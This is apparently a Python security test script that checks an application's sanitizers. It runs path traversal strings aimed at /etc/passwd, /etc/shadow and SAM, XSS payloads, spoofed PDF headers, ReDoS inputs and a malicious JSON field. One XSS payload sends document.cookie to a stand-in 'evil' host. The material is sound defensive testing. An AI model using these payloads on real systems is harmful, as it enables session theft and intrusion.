"""
Security Audit — מדמה וקטורי תקיפה ידועים על המערכת.
Run:  python security_audit.py

מנתר את:
  1. Path Traversal דרך uploads
  2. XSS payload בתוך תוכן PDF
  3. JSON tampering
  4. Filename normalization attacks
  5. Magic-bytes spoofing
  6. ReDoS על regex patterns
"""
from __future__ import annotations
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from src.security import (safe_filename, validate_pdf_bytes, esc,
                           safe_id, safe_load_dataclass, truncate)

PASS, FAIL = "✅ PASS", "❌ FAIL"
results = []


def check(name: str, ok: bool, evidence: str = ""):
    results.append((name, ok, evidence))
    mark = PASS if ok else FAIL
    print(f"{mark}  {name}")
    if evidence and not ok:
        print(f"        evidence: {evidence}")


print("=" * 70)
print("🛡️  Security Audit — בדיקות אבטחה אוטומטיות")
print("=" * 70)
print()

# ============================================================================
# 1. Path Traversal Tests
# ============================================================================
print("\n--- 1. Path Traversal protection ---")

attacks_pt = [
    "../../../etc/passwd",
    "..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "/etc/shadow",
    "C:\\Windows\\System32\\config\\SAM",
    "valid.pdf/../../../app.py",
    ".env",
    "../app.py",
    "\x00.pdf",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
for attack in attacks_pt:
    sanitized = safe_filename(attack)
    # Verify: no '..', no '/', no '\', no leading '.'
    safe = (".." not in sanitized and "/" not in sanitized
            and "\\" not in sanitized and not sanitized.startswith(".")
            and "\x00" not in sanitized)
    check(f"path_traversal: {attack!r}", safe, f"got {sanitized!r}")

# ============================================================================
# 2. Filename normalization attacks (Unicode)
# ============================================================================
print("\n--- 2. Unicode normalization attacks ---")

unicode_attacks = [
    "‮..gpd.exe",   # RTL override
    "​.pdf",         # zero-width space
    "test_NULL_.pdf",     # null byte injection
    "test.pdf\x00.exe",   # null byte rejection
    "﻿.pdf",         # BOM
    "test‎.pdf",     # LTR mark
]
for attack in unicode_attacks:
    sanitized = safe_filename(attack)
    safe = "\x00" not in sanitized and "..exe" not in sanitized.lower()
    check(f"unicode: {attack!r}", safe, f"got {sanitized!r}")

# ============================================================================
# 3. XSS payload escaping
# ============================================================================
print("\n--- 3. XSS payload escaping ---")

xss_attacks = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "\"><script>fetch('//evil?'+document.cookie)</script>",
    "<svg onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<a href='javascript:alert(1)'>click</a>",
    "</style><script>alert(1)</script>",
    "<style>@import 'javascript:alert(1)'</style>",
]
for attack in xss_attacks:
    escaped = esc(attack)
    safe = ("<script>" not in escaped and "onerror=" not in escaped
            and "javascript:" not in escaped or "&lt;" in escaped)
    # יותר מדויק: ודא שתגיות לא נשארות כפי שהן
    has_open_tag = "<" in escaped and ">" in escaped and "&lt;" not in escaped
    check(f"xss: {attack[:40]!r}", not has_open_tag, f"got {escaped[:80]!r}")

# ============================================================================
# 4. PDF magic-bytes validation
# ============================================================================
print("\n--- 4. PDF magic-bytes validation ---")

fake_pdfs = [
    (b"<html><script>alert(1)</script></html>", False, "HTML as PDF"),
    (b"GIF89a...", False, "GIF as PDF"),
    (b"", False, "empty file"),
    (b"x" * 50, False, "tiny file"),
    (b"%PDF-1.4\n" + b"x" * 200, True, "valid PDF header"),
    (b"\xff\xd8\xff\xe0" + b"x" * 200, False, "JPEG header"),
    (b"PK\x03\x04" + b"x" * 200, False, "ZIP header"),
]
for data, expected_ok, descr in fake_pdfs:
    ok, err = validate_pdf_bytes(data)
    check(f"magic_bytes: {descr}", ok == expected_ok,
          f"expected ok={expected_ok}, got ok={ok}, err={err!r}")

# ============================================================================
# 5. Oversized file rejection
# ============================================================================
print("\n--- 5. DoS protection (file size) ---")
huge = b"%PDF-1.4\n" + b"x" * (60 * 1024 * 1024)  # 60MB
ok, err = validate_pdf_bytes(huge)
check("oversized_file_rejected", not ok, f"err={err}")

# ============================================================================
# 6. Safe ID validation (finding_id, etc.)
# ============================================================================
print("\n--- 6. ID sanitization (finding_id, etc.) ---")
id_attacks = [
    "../../../etc/passwd",
    "/etc/passwd",
    "abc\x00",
    "abc<script>",
    "abc/../def",
    "abc def",
    "....////",
    "a" * 200,  # too long
]
for attack in id_attacks:
    sid = safe_id(attack)
    safe = ("/" not in sid and "\\" not in sid and ".." not in sid
            and len(sid) <= 64 and "<" not in sid)
    check(f"safe_id: {attack[:30]!r}", safe, f"got {sid!r}")

# ============================================================================
# 7. ReDoS test — regex patterns בקוד שלנו
# ============================================================================
print("\n--- 7. ReDoS protection ---")
import re
import time

# בדיקה: רגקס כפול עם backreferences יכול להיות מעריכי
patterns_to_test = [
    (r"(\d+[.,]?\d*)", "_NUM_RE"),
    (r"(\d+(?:[.,]\d+)?)\s*(?:₪|ש[\"׳']?ח|ILS\b)", "_SHEKEL_AFTER"),
    (r"ה\s*נ\s*ח\s*ה|ה\s*ט\s*ב\s*ה", "_DISCOUNT_RE"),
]
malicious = "a" * 100 + "!" * 100  # קלט ארוך, ללא התאמה
for pat, name in patterns_to_test:
    rx = re.compile(pat)
    t0 = time.time()
    rx.search(malicious)
    elapsed = (time.time() - t0) * 1000
    check(f"redos: {name} (<100ms)", elapsed < 100,
          f"took {elapsed:.1f}ms")

# ============================================================================
# 8. Safe dataclass load from untrusted JSON
# ============================================================================
print("\n--- 8. Safe dataclass loading ---")
from dataclasses import dataclass

@dataclass
class TestDC:
    name: str
    value: int

# ניסיון להעביר שדה זדוני
malicious_data = {
    "name": "test",
    "value": 42,
    "__class__": "danger",
    "exec": "import os; os.system('whoami')",
}
result = safe_load_dataclass(TestDC, malicious_data)
check("dataclass_extra_fields_rejected", result is not None and result.name == "test",
      f"result={result}")

# ============================================================================
# 9. Truncation prevents prompt injection / token waste
# ============================================================================
print("\n--- 9. Truncation ---")
huge_text = "AAAA" * 10000
truncated = truncate(huge_text, 500)
check("truncation_enforced", len(truncated) <= 501,
      f"len={len(truncated)}")

# ============================================================================
# Summary
# ============================================================================
print("\n" + "=" * 70)
total = len(results)
passed = sum(1 for _, ok, _ in results if ok)
failed = total - passed
print(f"Total: {total} | Passed: {passed} | Failed: {failed}")
if failed:
    print(f"\n⚠ Failed checks:")
    for name, ok, ev in results:
        if not ok:
            print(f"   • {name}: {ev}")
else:
    print("\n✅ ALL SECURITY CHECKS PASSED")

print("=" * 70)
sys.exit(0 if failed == 0 else 1)
